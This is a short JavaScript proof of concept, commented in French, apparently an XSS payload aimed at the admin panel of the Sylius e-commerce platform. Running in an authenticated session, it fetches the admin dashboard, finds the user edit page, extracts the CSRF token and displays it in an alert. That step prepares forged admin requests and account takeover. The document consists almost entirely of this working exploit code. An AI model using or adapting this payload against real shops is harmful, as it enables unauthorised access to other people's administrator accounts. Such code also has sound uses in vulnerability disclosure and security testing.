(async () => {
  try {
    // 1) Récupère le dashboard (qui contient forcément le lien profil)
    const dash = await fetch('/admin/', { credentials: 'include' });
    if (!dash.ok) throw new Error('Dashboard HTTP ' + dash.status);
    if (/\/login\b/.test(dash.url)) { alert('Session expirée (redirigé login)'); return; }

    const dashDoc = new DOMParser().parseFromString(await dash.text(), 'text/html');

    // 2) Trouve le lien /admin/users/<id>/edit (ex. "My account")
    const links = Array.from(dashDoc.querySelectorAll('a[href]'));
    const editLink = links.find(a => /^\/admin\/users\/\d+\/edit$/.test(a.getAttribute('href') || ''));

    if (!editLink) { alert('Lien /admin/users/<id>/edit introuvable'); return; }
    const editHref = editLink.getAttribute('href');

    // 3) Charge la page d’édition
    const edit = await fetch(editHref, { credentials: 'include' });
    if (!edit.ok) throw new Error('Edit HTTP ' + edit.status);
    if (/\/login\b/.test(edit.url)) { alert('Session expirée (redirigé login)'); return; }

    const editDoc = new DOMParser().parseFromString(await edit.text(), 'text/html');

    // 4) Récupère le token CSRF (spécifique Sylius)
    const tokenInput =
      editDoc.querySelector('input[name="sylius_admin_user[_token]"]') ||
      editDoc.querySelector('input[name$="[_token]"]') ||
      editDoc.querySelector('input[name="_csrf_token"]');

    const token = tokenInput?.value;
    if (!token) { alert('CSRF token introuvable'); return; }

    // 5) PoC visuel
    alert('CSRF token = ' + token);
  } catch (e) {
    console.error(e);
    alert('Erreur: ' + (e?.message || e));
  }
})();
